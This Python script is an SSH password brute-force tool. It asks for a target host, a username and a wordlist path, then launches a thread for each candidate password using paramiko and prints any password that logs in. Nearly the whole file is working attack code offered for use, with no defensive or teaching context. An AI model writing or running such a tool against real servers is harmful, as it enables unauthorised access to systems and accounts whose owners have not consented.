from attr import attr
import paramiko, sys, os, socket, termcolor
import threading, time

stop_flag = 0


def hunter_ssh():
    def ssh_connect(password, code=0):
        global stop_flag
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(host, port=22, username=username, password=password)
            stop_flag = 1
            print(termcolor.colored(('[+] Found Password: ' + password + ' , For Account: ' + username), 'green',attrs=['bold']))
        except:
            print(termcolor.colored(('[-] Incorrect Login: ' + password), 'red',attrs=['bold']))
        ssh.close()

    host = input('[+] Target Address: ')
    username = input('[+] SSH Username: ')
    input_file = input('[+] Path to Passwords File: ')
    print('\n')

    if os.path.exists(input_file) == False:
        print(termcolor.colored('[!!] That File/Path Doesnt Exists','red',attrs=['bold']))
        sys.exit(1)

    print('====== Starting Threaded SSH Bruteforce On ' + host + ' With Account: ' + username + ' ======')


    with open(input_file, 'r') as file:
        for line in file.readlines():
            if stop_flag == 1:
                t.join()
                exit()
            password = line.strip()
            t = threading.Thread(target=ssh_connect, args=(password,))
            t.start()
            time.sleep(0.5)